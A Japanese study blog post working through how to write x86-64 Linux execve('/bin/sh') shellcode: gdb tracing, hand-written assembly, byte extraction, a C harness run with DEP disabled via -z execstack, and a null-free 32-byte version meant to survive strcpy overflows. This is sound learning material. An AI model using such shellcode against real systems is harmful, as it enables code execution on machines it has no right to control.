# x86-64でシェルコードを書いてみる
ももいろテクノロジーさんの記事を１から自分なりにおさらいして行こうと思う。

## 環境
```
❯ uname -a
Linux mizuiro-arch 5.10.70-1-MANJARO #1 SMP PREEMPT Thu Sep 30 15:29:01 UTC 2021 x86_64 GNU/Linux
❯ lsb_release -a
LSB Version:	n/a
Distributor ID:	ManjaroLinux
Description:	Manjaro Linux
Release:	21.1.6
Codename:	Pahvo
❯ gcc --version
gcc (GCC) 11.1.0
Copyright (C) 2021 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
```
## Cのプログラムを書く
まず以下のようなシェルを起動させるプログラムを書く。
```
/* execve.c */
#include <unistd.h>

int main()
{
    char *argv[] = {"/bin/sh", NULL};
    execve(argv[0], argv, NULL);
}
```
# デバッガで挙動を追う
シェルコードに起こすために、
これを実際にデバッグして、どのように動いているのか追ってみる

```
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401795 <+0>:	push   rbp
   0x0000000000401796 <+1>:	mov    rbp,rsp
=> 0x0000000000401799 <+4>:	sub    rsp,0x20
   0x000000000040179d <+8>:	mov    rax,QWORD PTR fs:0x28
   0x00000000004017a6 <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004017aa <+21>:	xor    eax,eax
   0x00000000004017ac <+23>:	lea    rax,[rip+0x80851]        # 0x482004
   0x00000000004017b3 <+30>:	mov    QWORD PTR [rbp-0x20],rax
   0x00000000004017b7 <+34>:	mov    QWORD PTR [rbp-0x18],0x0
   0x00000000004017bf <+42>:	mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004017c3 <+46>:	lea    rcx,[rbp-0x20]
   0x00000000004017c7 <+50>:	mov    edx,0x0
   0x00000000004017cc <+55>:	mov    rsi,rcx
   0x00000000004017cf <+58>:	mov    rdi,rax
   0x00000000004017d2 <+61>:	call   0x43e570 <execve>
   0x00000000004017d7 <+66>:	mov    eax,0x0
   0x00000000004017dc <+71>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004017e0 <+75>:	sub    rdx,QWORD PTR fs:0x28
   0x00000000004017e9 <+84>:	je     0x4017f0 <main+91>
   0x00000000004017eb <+86>:	call   0x440e20 <__stack_chk_fail_local>
   0x00000000004017f0 <+91>:	leave  
   0x00000000004017f1 <+92>:	ret    
End of assembler dump.
```
execveがなにをしているのか確認する
```
gef➤  disas execve
   0x000000000043e570 <+0>:	endbr64 
   0x000000000043e574 <+4>:	mov    eax,0x3b
   0x000000000043e579 <+9>:	syscall 
   0x000000000043e57b <+11>:	cmp    rax,0xfffffffffffff001
   0x000000000043e581 <+17>:	jae    0x43e584 <execve+20>
   0x000000000043e583 <+19>:	ret    
   0x000000000043e584 <+20>:	mov    rcx,0xffffffffffffffc0
   0x000000000043e58b <+27>:	neg    eax
   0x000000000043e58d <+29>:	mov    DWORD PTR fs:[rcx],eax
   0x000000000043e590 <+32>:	or     rax,0xffffffffffffffff
   0x000000000043e594 <+36>:	ret   
```

syscallが呼ばれているのでその直前の状態を見る
```
gef➤  b *0x000000000043e579
Breakpoint 2 at 0x43e579
gef➤  c
```

```
gef➤  i register
rax            0x3b                0x3b
rbx            0x400538            0x400538
rcx            0x7fffffffd590      0x7fffffffd590
rdx            0x0                 0x0
rsi            0x7fffffffd590      0x7fffffffd590
rdi            0x482004            0x482004
rbp            0x7fffffffd5b0      0x7fffffffd5b0
rsp            0x7fffffffd588      0x7fffffffd588
r8             0x0                 0x0
r9             0x36f8              0x36f8
r10            0x4ae840            0x4ae840
r11            0x206               0x206
r12            0x403cb0            0x403cb0
r13            0x0                 0x0
r14            0x4ae018            0x4ae018
r15            0x400538            0x400538
rip            0x43e579            0x43e579 <execve+9>
eflags         0x246               [ PF ZF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
```

$raxに0x3b、つまり59が入っていた。
調べてみると、
![](https://i.imgur.com/W6lzVO7.png)
となっていた。
左から%rax,System call,%rdi,%rsi,%rdx,%r10,%r8,%r9となるらしい。
つまり、これはsys_execve(rdi,rsi,rdx)を実行していることになる。

実際に、これらのレジスタを読んで見る。
まずは１つ目の引数
```
gef➤  x/4wx $rdi
0x482004:	0x6e69622f	0x0068732f	0x00000000	0x00000000
gef➤  x/s $rdi
0x482004:	"/bin/sh"

```
ちゃんと文字列として"/bin/sh"が入っていることがわかる
次に２つ目の引数
```
gef➤  x/4wx $rsi
0x7fffffffd590:	0x00482004	0x00000000	0x00000000	0x00000000
```
なぜか、rdiへのアドレスが格納されていた。
情報通りならここにはargv[]が格納されているのになぁ
> 解決 "/bin/sh" の先頭アドレスが格納されているので、その先も読み取れることになるっぽい？

つまりこのようになっている
```
rax = 59
rdi = 0x482004 = "/bin/sh" の先頭アドレス
rcx = 0x7fffffffd590 = [0x00482004,0x00000000,...] = ["/bin/sh" の先頭アドレス,NULL,...]
rdx = 0
```

要するに、レジスタをこの状態にセットしてsyscallを呼べば、シェルが立ち上がることになる。

なおraxに入っている59はexecveのシステムコール番号である。
これは次のように確認することができる
```
❯ cat /usr/include/asm/unistd.h
/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
#ifndef _ASM_X86_UNISTD_H
#define _ASM_X86_UNISTD_H

/*
 * x32 syscall flag bit.  Some user programs expect syscall NR macros
 * and __X32_SYSCALL_BIT to have type int, even though syscall numbers
 * are, for practical purposes, unsigned long.
 *
 * Fortunately, expressions like (nr & ~__X32_SYSCALL_BIT) do the right
 * thing regardless.
 */
#define __X32_SYSCALL_BIT	0x40000000

# ifdef __i386__
#  include <asm/unistd_32.h>
# elif defined(__ILP32__)
#  include <asm/unistd_x32.h>
# else
#  include <asm/unistd_64.h>
# endif

#endif /* _ASM_X86_UNISTD_H */
```
今回は64ビット環境なのでarm/unistd_64.hを見る
```
❯ cat /usr/include/asm/unistd_64.h | grep exe
#define __NR_execve 59
#define __NR_kexec_load 246
#define __NR_kexec_file_load 320
#define __NR_execveat 322
```

## アセンブリコードを書いてみる
ディスアセンブルして出てきた結果を参考にしながら、自分でアセンブリコードを書いてみる。   
ここでは、ediやrcxが指す先のバイト列をスタック上に作り、適当なタイミングでesp（スタックの頂上を指すアドレス）を各レジスタにセットする方法を取っている。   
xor edx, edxはmov edx, 0と同じ意味をもつ、より効率的な命令である。  
```
/* execve.s */
        .intel_syntax noprefix
        .globl _start
_start:
        xor rdx, rdx #*envp[]
        push rdx
        mov rax, 0x0068732f6e69622f #"/bin/sh"
        push rax
        mov rdi, rsp    #*pathname
        push rdx
        push rdi
        mov rsi, rsp    #*argv[] 
        xor rax, rax
        mov eax, 0x3b
        syscall


```
64bitの値はそのままpush出来ないので一回raxにいれてからpushしてあげる。
アセンブルして実行してみる。 ここではコードの最小化のため、自分でエントリポイント_startを定義し、libcなどのライブラリにリンクしないようにしている。

```
❯ gcc -nostdlib execve.s
❯ ./a.out
sh-5.1$ uname -a
Linux mizuiro-arch 5.10.70-1-MANJARO #1 SMP PREEMPT Thu Sep 30 15:29:01 UTC 2021 x86_64 GNU/Linux
```

ディスアセンブルすると、実際に書いたアセンブリコードが機械語になっていることがわかる。

```
❯ objdump -M intel -d a.out

a.out:     ファイル形式 elf64-x86-64


セクション .text の逆アセンブル:

0000000000001000 <_start>:
    1000:	48 31 d2             	xor    rdx,rdx
    1003:	52                   	push   rdx
    1004:	48 b8 2f 62 69 6e 2f 	movabs rax,0x68732f6e69622f
    100b:	73 68 00 
    100e:	50                   	push   rax
    100f:	48 89 e7             	mov    rdi,rsp
    1012:	52                   	push   rdx
    1013:	57                   	push   rdi
    1014:	48 89 e6             	mov    rsi,rsp
    1017:	48 31 c0             	xor    rax,rax
    101a:	b8 3b 00 00 00       	mov    eax,0x3b
    101f:	0f 05                	syscall
```

ここに表示されているバイト列の先頭にeipを移すことができれば、シェルが立ち上がる。

## シェルコードを明示的に実行させてみる
上で作ったシェルコードをもとに、明示的に実行させるコードをC言語で書くと次のようになる。
```
$ objdump -M intel -d a.out | grep '^ ' | cut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g'
\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\x0f\x05
```
> fishで動かすと\xがつかないのでbashで立ち上げる

```
/* shell.c */
int main()
{
    char shellcode[] =
        "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\x0f\x05";

    (*(void (*)())shellcode)();
}
```
コンパイルして実行しようとすると落ちる
```
❯ gcc shell.c
❯ ./a.out
fish: Job 1, './a.out' terminated by signal SIGSEGV (Address boundary error)
```
これは、Data Execution Prevention (DEP) と呼ばれるセキュリティ機構により、スタック領域には実行可能ビットが立っていないからである。 
DEPは、その実装の名前からExecShieldと呼ばれることもある。
```
❯ objdump -x a.out
...
 DYNAMIC off    0x0000000000002de8 vaddr 0x0000000000003de8 paddr 0x0000000000003de8 align 2**3
         filesz 0x00000000000001f0 memsz 0x00000000000001f0 flags rw-
    NOTE off    0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3
         filesz 0x0000000000000040 memsz 0x0000000000000040 flags r--
    NOTE off    0x0000000000000378 vaddr 0x0000000000000378 paddr 0x0000000000000378 align 2**2
         filesz 0x0000000000000044 memsz 0x0000000000000044 flags r--
0x6474e553 off    0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3
         filesz 0x0000000000000040 memsz 0x0000000000000040 flags r--
EH_FRAME off    0x0000000000002004 vaddr 0x0000000000002004 paddr 0x0000000000002004 align 2**2
         filesz 0x0000000000000034 memsz 0x0000000000000034 flags r--
   STACK off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4
         filesz 0x0000000000000000 memsz 0x0000000000000000 flags rw-
   RELRO off    0x0000000000002dd8 vaddr 0x0000000000003dd8 paddr 0x0000000000003dd8 align 2**0
         filesz 0x0000000000000228 memsz 0x0000000000000228 flags r--
...
```
STACKと書かれた部分から、スタック領域にはxビットが立っていないことがわかる。

DEPを無効にしてコンパイルすると、シェルの起動に成功する。
```
❯ gcc -z execstack shell.c
❯ ./a.out
sh-5.1$ uname -a
Linux mizuiro-arch 5.10.70-1-MANJARO #1 SMP PREEMPT Thu Sep 30 15:29:01 UTC 2021 x86_64 GNU/Linux
sh-5.1$ exit
exit

```
プログラムヘッダを調べてみると、この場合はスタック領域が実行可能になっていることが確認できる。
```
❯ objdump -x a.out
プログラムヘッダ:
    PHDR off    0x0000000000000040 vaddr 0x0000000000000040 paddr 0x0000000000000040 align 2**3
         filesz 0x00000000000002d8 memsz 0x00000000000002d8 flags r--
  INTERP off    0x0000000000000318 vaddr 0x0000000000000318 paddr 0x0000000000000318 align 2**0
         filesz 0x000000000000001c memsz 0x000000000000001c flags r--
    LOAD off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**12
         filesz 0x0000000000000648 memsz 0x0000000000000648 flags r--
    LOAD off    0x0000000000001000 vaddr 0x0000000000001000 paddr 0x0000000000001000 align 2**12
         filesz 0x0000000000000245 memsz 0x0000000000000245 flags r-x
    LOAD off    0x0000000000002000 vaddr 0x0000000000002000 paddr 0x0000000000002000 align 2**12
         filesz 0x0000000000000110 memsz 0x0000000000000110 flags r--
    LOAD off    0x0000000000002dd8 vaddr 0x0000000000003dd8 paddr 0x0000000000003dd8 align 2**12
         filesz 0x0000000000000258 memsz 0x0000000000000260 flags rw-
 DYNAMIC off    0x0000000000002de8 vaddr 0x0000000000003de8 paddr 0x0000000000003de8 align 2**3
         filesz 0x00000000000001f0 memsz 0x00000000000001f0 flags rw-
    NOTE off    0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3
         filesz 0x0000000000000040 memsz 0x0000000000000040 flags r--
    NOTE off    0x0000000000000378 vaddr 0x0000000000000378 paddr 0x0000000000000378 align 2**2
         filesz 0x0000000000000044 memsz 0x0000000000000044 flags r--
0x6474e553 off    0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3
         filesz 0x0000000000000040 memsz 0x0000000000000040 flags r--
EH_FRAME off    0x0000000000002004 vaddr 0x0000000000002004 paddr 0x0000000000002004 align 2**2
         filesz 0x0000000000000034 memsz 0x0000000000000034 flags r--
   STACK off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4
         filesz 0x0000000000000000 memsz 0x0000000000000000 flags rwx
   RELRO off    0x0000000000002dd8 vaddr 0x0000000000003dd8 paddr 0x0000000000003dd8 align 2**0
         filesz 0x0000000000000228 memsz 0x0000000000000228 flags r--
```

## シェルコードからnullバイトを取り除く

上で作ったシェルコードは正しい機械語列ではあるが、途中にnullバイト (\x00) が入っている。 しかしこれでは、シェルコードを送り込むのにstrcpyでのバッファオーバーフローなどを利用する場合、途中のnullバイトが文字列終端とみなされてしまい、最後までシェルコードを送り込むことができない。 つまり、実用的なシェルコードとしてはnullバイトを含まない (null-free) であることが望ましい。

そこで、上で作ったシェルコードをnull-freeなものに書き換えてみる。
```
/* execve2.s */
        .intel_syntax noprefix
        .globl _start
_start:
        xor rdx, rdx #*envp[]
        push rdx
        mov rax, 0x68732f2f6e69622f #"/bin/sh"
        push rax
        mov rdi, rsp    #*pathname
        push rdx
        push rdi
        mov rsi, rsp    #*argv[] 
        xor rax, rax
        lea rax, [rdx+59]
        syscall



```
以下のことを行った
* /bin/shを/bin//shに置き換えることによって64bitの余った部分を"/"つまり2fで埋めることが出来た
* eaxに即値を入れる変わりにlea rax, [edx+59]とした

アセンブルして実行すると、問題なくシェルが立ち上がる。

ディスアセンブルしてみると、00がなくなっていることが確認できる
```
❯ objdump -M intel -d a.out

a.out:     ファイル形式 elf64-x86-64


セクション .text の逆アセンブル:

0000000000001000 <_start>:
    1000:	48 31 d2             	xor    rdx,rdx
    1003:	52                   	push   rdx
    1004:	48 b8 2f 62 69 6e 2f 	movabs rax,0x68732f2f6e69622f
    100b:	2f 73 68 
    100e:	50                   	push   rax
    100f:	48 89 e7             	mov    rdi,rsp
    1012:	52                   	push   rdx
    1013:	57                   	push   rdi
    1014:	48 89 e6             	mov    rsi,rsp
    1017:	48 31 c0             	xor    rax,rax
    101a:	48 8d 42 3b          	lea    rax,[rdx+0x3b]
    101e:	0f 05                	syscall 

```

```
[mizuiro@mizuiro-arch shellcode_tutorail_x86_64]$ objdump -M intel -d a.out | grep '^ ' | cut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g'
\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\x48\x8d\x42\x3b\x0f\x05
```

```
/* shell2.c */
#include <stdio.h>

int main()
{
    char shellcode[] = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\x48\x8d\x42\x3b\x0f\x05";
    printf("sizeof(shellcode) == %d\n", sizeof(shellcode));
    (*(void (*)())shellcode)();
}
```

```
❯ gcc -z execstack shell2.c
❯ ./a.out
sizeof(shellcode) == 33
sh-5.1$ uname -a
Linux mizuiro-arch 5.10.70-1-MANJARO #1 SMP PREEMPT Thu Sep 30 15:29:01 UTC 2021 x86_64 GNU/Linux
sh-5.1$ 
```
このシェルコードは33バイトである。

